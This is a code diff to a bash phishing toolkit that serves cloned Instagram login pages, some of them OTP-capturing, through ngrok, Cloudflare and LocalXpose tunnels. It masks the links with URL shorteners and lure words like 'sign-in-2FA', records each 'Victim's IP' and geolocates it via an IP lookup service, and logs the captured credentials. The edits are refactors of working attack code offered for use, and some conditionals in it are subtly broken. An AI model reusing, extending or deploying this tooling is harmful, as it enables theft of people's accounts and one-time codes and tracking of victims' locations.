@@ -1,4 +1,4 @@
-##COLOUR VARIABLES
+#COLOUR VARIABLES
 
 #Text
 RED="$(printf '\033[31m')"
@@ -178,15 +178,6 @@ check_net_update(){
 	fi
 }
 
-exit_internet(){
-	check_netstats
-	if [ $netstats=="Offline" ]; then
-		{ clear; banner; echo; }
-		echo -e "${REDBG}${BLACK} Check your internet connection and try again.${RESETBG}\n"
-		{ reset_color; exit 0; }
-	fi
-}
-
 #check for updates
 check_update() {
         rm -rf version.txt
@@ -263,7 +254,7 @@ MASKING() { #4 last one using url shortner apis
 			MASK_SUFfix=$(grep -o '9qr.de/[-0-9a-zA-Z]*' ".uri.log")
 		fi
 	else
-		echo "${GREEN}[${WHITE}!${GREEN}]${GREEN}Erroe occured while masking try again"
+		echo "${GREEN}[${WHITE}!${GREEN}]${GREEN}Error occured while masking try again"
 		sleep 5
 		cusurl
 	fi
@@ -291,7 +282,7 @@ cusurl(){
 			read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN}Enter Your Custom uRL (eg:https://google.com | www.google.com):" CUS_URL
                 	checkurl ${CUS_URL}
         	        echo " "
-	                read -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Some KeyStocks (${WHITE}eg: sign-in-2FA ${ORANGE})${GREEN} : ${ORANGE}" Keystks #KEY_STOCKS
+	                read -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Some KeyStocks (${WHITE}eg: sign-in-2FA ${ORANGE})${GREEN} : ${ORANGE}" Keystks
                 	if [[ ${Keystks} =~ ^([0-9a-zA-Z-]*)$ ]]; then
 	                        MASKING
         	        else
@@ -308,44 +299,53 @@ cusurl(){
 	                { clear; banner; cusurl; }
                 esac
 }
-
+checklink() {
+	if [ ${LINK}=="" ]; then
+		clear
+		banner
+		echo " "
+		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Error in generating the link"
+		echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Starting localhost. You might need to start tunneler manually"
+		sleep 6
+		start_localhost
+	else
+		cusurl
+	fi
+}
 
 ## Install ngrok
 check_ngrok(){
 	if [ ! -e ".server/ngrok" ]; then
 		read -p "${GREEN}[${WHITE}?${GREEN}]${GREEN} Ngrok Not installed do you want to install ngrok now? (Y/n) : ${BLUE}"
 		case $REPLY in
-												Y | y)
-												install_ngrok
-												ngrok_token_check;;
-
-												N | n | *)
-																tunnelmenu;;
-
+		Y | y)
+			install_ngrok
+			start_ngrok;;
+		N | n | *)
+			tunnelmenu;;
 		esac
 	else
-		ngrok_token_check
+		start_ngrok
 	fi
 }
 install_ngrok() {
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
-		arch=`uname -m`
-		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz' 'ngrok'
-		elif [[ "$arch" == *'aarch64'* ]]; then
-			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz' 'ngrok'
-		elif [[ "$arch" == *'x86_64'* ]]; then
-			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz' 'ngrok'
-		else
-			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz' 'ngrok'
-		fi
+	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
+	arch=`uname -m`
+	if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+		download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz' 'ngrok'
+	elif [[ "$arch" == *'aarch64'* ]]; then
+		download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz' 'ngrok'
+	elif [[ "$arch" == *'x86_64'* ]]; then
+		download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz' 'ngrok'
+	else
+		download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz' 'ngrok'
+	fi
 }
 
 ##Ngrok token auth
 ngrok_token_check(){
         if [ -s "${HOME}/.ngrok2/ngrok.yml" ]; then
                 echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Ngrok Authtoken setup is already done."
-								start_ngrok
         else
                 echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Setting up authtoken"
                 ngrok_token_setup
@@ -372,12 +372,12 @@ ngrok_token_setup(){
                echo "authtoken : ${ntoken}" >> ngrok.yml
                mv ngrok.yml ${HOME}/.ngrok2/
         fi
-start_ngrok
+	start_ngrok
 }
 
 ## Start ngrok
 start_ngrok() {
-        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST ${GREEN})"
         { sleep 1; setup_site; }
         echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
         ngrok_token_check
@@ -389,8 +389,8 @@ start_ngrok() {
 
         { sleep 8; clear; banner; }
         ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
-				LINK="${ngrok_url}"
-				cusurl
+	LINK="${ngrok_url}"
+	checklink
         capture_data_check
 }
 
@@ -399,28 +399,28 @@ check_cloudflared(){
 	if [ ! -e ".server/cloudflared" ]; then
 		read -p "${GREEN}[${WHITE}?${GREEN}]${GREEN} Cloudflared Not installed do you want to install Cloudflared now? (Y/n) : ${BLUE}"
 		case $REPLY in
-												Y | y)
-																install_cloudflared
-																start_cloudflared;;
-
-												N | n | *)
-																tunnelmenu;;
-
+		Y | y)
+			install_cloudflared
+			start_cloudflared;;
+		N | n | *)
+			tunnelmenu;;
 		esac
+	else
+		start_cloudflared
 	fi
 }
 install_cloudflared() {
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
-		arch=`uname -m`
-		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
-		elif [[ "$arch" == *'aarch64'* ]]; then
-			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
-		elif [[ "$arch" == *'x86_64'* ]]; then
-			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
-		else
-			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
-		fi
+	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
+	arch=`uname -m`
+	if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+		download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
+	elif [[ "$arch" == *'aarch64'* ]]; then
+		download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
+	elif [[ "$arch" == *'x86_64'* ]]; then
+		download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
+	else
+		download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
+	fi
 }
 
 ## Start Cloudflared
@@ -439,8 +439,8 @@ start_cloudflared() {
         { sleep 8; clear; banner; }
 
         cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
-				LINK="${cldflr_link}"
-				cusurl
+	LINK="${cldflr_link}"
+	checklink
         capture_data_check
 }
 
@@ -449,29 +449,29 @@ check_localxpose(){
 	if [ ! -e ".server/loclx" ]; then
 		read -p "${GREEN}[${WHITE}?${GREEN}]${GREEN} Localxpose Not installed do you want to install localxpose now? (Y/n) : ${BLUE}"
 		case $REPLY in
-												Y | y)
-																install_localxpose
-																token_localxpose
-																start_loclx;;
-
-												N | n | *)
-																tunnelmenu;;
+		Y | y)
+			install_localxpose
+			start_loclx;;
+		N | n | *)
+			tunnelmenu;;
 
 		esac
+	else
+		start_loclx
 	fi
 }
 install_localxpose() {
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
-		arch=`uname -m`
-		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
-		elif [[ "$arch" == *'aarch64'* ]]; then
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
-		elif [[ "$arch" == *'x86_64'* ]]; then
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
-		else
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
-		fi
+	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
+	arch=`uname -m`
+	if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+		download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
+	elif [[ "$arch" == *'aarch64'* ]]; then
+		download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
+	elif [[ "$arch" == *'x86_64'* ]]; then
+		download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
+	else
+		download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
+	fi
 }
 
 token_localxpose() {
@@ -509,7 +509,7 @@ start_loclx() {
 	{ sleep 12; clear; banner; }
 	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io') #DONE :)
 	LINK="${loclx_url}"
-	cusurl
+	checklink
 	capture_data_check
 }
 
@@ -571,6 +571,7 @@ cusport() {
 
 setup_site() {
 	exit_internet
+	rm -rf $zipname
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Downloading site..."${WHITE}
 	zipfullname=$zipname".zip"
 	zipurl="https://github.com/Alygnt/phisher-modules/raw/main/csites/"$zipfullname
@@ -581,9 +582,11 @@ setup_site() {
 		echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up site..."${WHITE}
        		mv $zipfullname .server/www
 		unzip .server/www/"$zipfullname"
-		mv $zipname .server/www
+		mv $zipname/* .server/www
 		rm -rf .server/www/"$zipfullname"
-		cp -rf .server/www/"$website"/* .server/www
+		rm -rf "$zipname"
+##		rm -rf .server/www/"$zipname"
+##		cp -rf .server/www/"$website"/* .server/www/
 		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Setup complete..."${WHITE}
                 sleep 0.2
 		cusport
@@ -600,20 +603,20 @@ capture_ip() {
         IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
         IFS=$'\n'
         echo -e "\n${RED} Victim's IP : ${RED}$IP"
-if [ reply_tunnel=1 ]; then
-	echo -ne "${RED} IP details cannot be captured in localhost server"
-	echo " "
-	save_ip
-	rm -rf .server/www/ip.txt
-elif [ reply_tunnel=01 ]; then
-	echo -ne "${RED} IP details cannot be captured in localhost server"
-	echo " "
-	save_ip
-	rm -rf .server/www/ip.txt
-else
+	if [ reply_tunnel=1 ]; then
+		echo -ne "${RED} IP details cannot be captured in localhost server"
+		echo " "
+		save_ip
+		rm -rf .server/www/ip.txt
+	elif [ reply_tunnel=01 ]; then
+		echo -ne "${RED} IP details cannot be captured in localhost server"
+		echo " "
+		save_ip
+		rm -rf .server/www/ip.txt
+	else
 	ip_details
 	save_ip
-fi
+	fi
 }
 save_ip() {
 cat .server/dumps/space.txt >> ${log_name}.txt
@@ -623,73 +626,73 @@ mv ${log_name}.txt logs
 echo -ne "\n${BLUE} IP Details Saved in : ${GREEN} /logs/${log_name}.txt"
 }
 ip_details() {
-IFS='\n'
-iptracker=$(curl -s -L "http://ipwhois.app/json/$IP" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > location.txt &&  grep -o '"[^"]*"\s*:\s*"[^"]*"' location.txt > "${pro_dir}/track.txt")
-IFS=$'\n'
-iptt=$(sed -n 's/"ip"://p' "${pro_dir}/track.txt")
+	IFS='\n'
+	iptracker=$(curl -s -L "http://ipwhois.app/json/$IP" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > location.txt &&  grep -o '"[^"]*"\s*:\s*"[^"]*"' location.txt > "${pro_dir}/track.txt")
+	IFS=$'\n'
+	iptt=$(sed -n 's/"ip"://p' "${pro_dir}/track.txt")
 
-if [[ $iptt != "" ]]; then
-	echo -e  "\n${GREEN} Device ip: ${NC} $iptt"
-fi
-iptype=$(sed -n 's/"type"://p' "${pro_dir}/track.txt")
-if [[ $iptype != "" ]]; then
-	echo -e "\n${GREEN} IP type: ${NC} $iptype"
-fi
-latitude=$(sed -n 's/"latitude"://p' "${pro_dir}/track.txt")
-if [[ $latitude != "" ]]; then
-	echo -e  "\n${GREEN} Latitude:  ${NC} $latitude"
-fi
-longitude=$(sed -n 's/"longitude"://p' "${pro_dir}/track.txt")
-if [[ $longitude != "" ]]; then
-	echo -e  "\n${GREEN} Longitude:  ${NC} $longitude"
-fi
-city=$(sed -n 's/"city"://p' "${pro_dir}/track.txt")
-if [[ $city != "" ]]; then
-	echo -e "\n${GREEN} City: ${NC} $city"
-fi
-isp=$(sed -n 's/"isp"://p' "${pro_dir}/track.txt")
-if [[ $isp != "" ]]; then
+	if [[ $iptt != "" ]]; then
+		echo -e  "\n${GREEN} Device ip: ${NC} $iptt"
+	fi
+	iptype=$(sed -n 's/"type"://p' "${pro_dir}/track.txt")
+	if [[ $iptype != "" ]]; then
+		echo -e "\n${GREEN} IP type: ${NC} $iptype"
+	fi
+	latitude=$(sed -n 's/"latitude"://p' "${pro_dir}/track.txt")
+	if [[ $latitude != "" ]]; then
+		echo -e  "\n${GREEN} Latitude:  ${NC} $latitude"
+	fi
+	longitude=$(sed -n 's/"longitude"://p' "${pro_dir}/track.txt")
+	if [[ $longitude != "" ]]; then
+		echo -e  "\n${GREEN} Longitude:  ${NC} $longitude"
+	fi
+	city=$(sed -n 's/"city"://p' "${pro_dir}/track.txt")
+	if [[ $city != "" ]]; then
+		echo -e "\n${GREEN} City: ${NC} $city"
+	fi
+	isp=$(sed -n 's/"isp"://p' "${pro_dir}/track.txt")
+	if [[ $isp != "" ]]; then
 	echo -e "\n${GREEN} Isp: ${NC} $isp"
-fi
-country=$(sed -n 's/"country"://p' "${pro_dir}/track.txt")
-if [[ $country != "" ]]; then
-	echo -e  "\n${GREEN} Country: ${NC} $country"
-fi
-flag=$(sed -n 's/"country_flag"://p' "${pro_dir}/track.txt")
-if [[ $flag != "" ]]; then
-	echo -e "\n${GREEN} Country flag: ${NC} $flag"
-fi
-cap=$(sed -n 's/"country_capital"://p' "${pro_dir}/track.txt")
-if [[ $cap != "" ]]; then
-	echo -e "\n${GREEN} Country capital: ${NC} $cap"
-fi
-phon=$(sed -n 's/"country_phone"://p' "${pro_dir}/track.txt")
-if [[ $phon != "" ]]; then
-	echo -e "\n${GREEN} Country code: ${NC} $phon"
-fi
-continent=$(sed -n 's/"continent"://p' "${pro_dir}/track.txt")
-if [[ $continent != "" ]]; then
-	echo -e  "\n${GREEN} Continent:  ${NC} $continent"
-fi
-ccode=$(sed -n 's/"currency_code"://p' "${pro_dir}/track.txt")
-if [[ $ccode != "" ]]; then
-	echo -e "\n${GREEN} Currency code: ${NC} $ccode"
-fi
-region=$(sed -n 's/"region"://p' "${pro_dir}/track.txt")
-if [[ $region != "" ]]; then
-	echo -e "\n${GREEN} State: ${NC} $region"
-fi
-cat "${pro_dir}/track.txt" >> "${log_name}.txt"
-rm -rf "${pro_dir}/track.txt"
+	fi
+	country=$(sed -n 's/"country"://p' "${pro_dir}/track.txt")
+	if [[ $country != "" ]]; then
+		echo -e  "\n${GREEN} Country: ${NC} $country"
+	fi
+	flag=$(sed -n 's/"country_flag"://p' "${pro_dir}/track.txt")
+	if [[ $flag != "" ]]; then
+		echo -e "\n${GREEN} Country flag: ${NC} $flag"
+	fi
+	cap=$(sed -n 's/"country_capital"://p' "${pro_dir}/track.txt")
+	if [[ $cap != "" ]]; then
+		echo -e "\n${GREEN} Country capital: ${NC} $cap"
+	fi
+	phon=$(sed -n 's/"country_phone"://p' "${pro_dir}/track.txt")
+	if [[ $phon != "" ]]; then
+		echo -e "\n${GREEN} Country code: ${NC} $phon"
+	fi
+	continent=$(sed -n 's/"continent"://p' "${pro_dir}/track.txt")
+	if [[ $continent != "" ]]; then
+		echo -e  "\n${GREEN} Continent:  ${NC} $continent"
+	fi
+	ccode=$(sed -n 's/"currency_code"://p' "${pro_dir}/track.txt")
+	if [[ $ccode != "" ]]; then
+		echo -e "\n${GREEN} Currency code: ${NC} $ccode"
+	fi
+	region=$(sed -n 's/"region"://p' "${pro_dir}/track.txt")
+	if [[ $region != "" ]]; then
+		echo -e "\n${GREEN} State: ${NC} $region"
+	fi
+	cat "${pro_dir}/track.txt" >> "${log_name}.txt"
+	rm -rf "${pro_dir}/track.txt"
 }
 
 #Capture data check
 capture_data_check(){
-	if [ -f .server/www/$website/NOTP ];then
+	if [ -f .server/www/NOTP ];then
                 capture_data_1
-        elif [ -f .server/www/$website/OOTP ];then
+        elif [ -f .server/www/OOTP ];then
                 capture_data_2
-        elif [ -f .server/www/$website/POTP ];then
+        elif [ -f .server/www/POTP ];then
                 capture_data_3
 	else
 		echo " Error Occured in capturing data!!"
@@ -803,14 +806,24 @@ capture_data_3() {
 }
 
 #online or offline stats
-netstats="Offline"
 check_netstats() {
-			wget -q --spider http://api.github.com
-			if [ $? -eq 0 ]; then
-						netstats="Online"
-			else
-						netstats="Offline"
-			fi
+	wget -q --spider http://api.github.com
+	if [ $? -eq 0 ]; then
+		netstats="Online"
+	else
+		netstats="Offline"
+	fi
+}
+exit_internet(){
+	wget -q --spider http://api.github.com
+        if [ $? -eq 0 ]; then
+                netstats="Online"
+        else
+                netstats="Offline"
+		{ clear; banner; echo; }
+                echo -e "${REDBG}${BLACK} Check your internet connection and try again.${RESETBG}\n"
+                { reset_color; exit 0; }
+        fi
 }
 
 #Logs check
@@ -883,8 +896,8 @@ echo -e "${RED}[${WHITE}04${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}Max 15 min
                         check_ngrok;;
                 3 | 03)
                         check_cloudflared;;
-								4 | 04)
-				                check_localxpose;;
+		4 | 04)
+			check_localxpose;;
                 *)
 0                       echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; tunnelmenu; };;
@@ -892,6 +905,7 @@ echo -e "${RED}[${WHITE}04${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}Max 15 min
 }
 
 mainmenu() {
+clear
 echo -e " "
 echo -e " "
 echo -e " "
@@ -899,7 +913,7 @@ banner
 echo -e " "
 echo -e " "
 exit_internet
-echo "${GREEN}Network Status ${NC}= ${RED}$netstats"
+echo "${GREEN}Network Status = ${RED}$netstats"
 echo -e " "
 echo -e "${RED} CHOOSE A SITE : ${NC}"
 echo -e " "
@@ -1571,7 +1585,7 @@ echo -e "${BLUE}[08]${CYAN} Instagram Followers - WITH OTP ${NC}"
 echo -e "${BLUE}[09]${CYAN} Instagram Verify - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[10]${CYAN} Instagram Old - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[11]${CYAN} Instagram Old - WITH OTP ${NC}"
-echo -e "${BLUE}[12]${CYAN} Instagram Video - WITHOUT OTP ${NC
+echo -e "${BLUE}[12]${CYAN} Instagram Video - WITHOUT OTP ${NC}"
 echo -e " ${NC}"
 read -p "${MAGENTA} YOUR CHOICE : " choice
 
@@ -1620,10 +1634,10 @@ case $choice in
                 website="ig_old/otp"
 		zipname="ig_old"
                 tunnelmenu;;
-				12)
-								website="ig_video"
-								zipname="ig_video"
-								tunnelmenu;;
+	12)
+		website="ig_video"
+		zipname="ig_video"
+		tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_instagram; };;
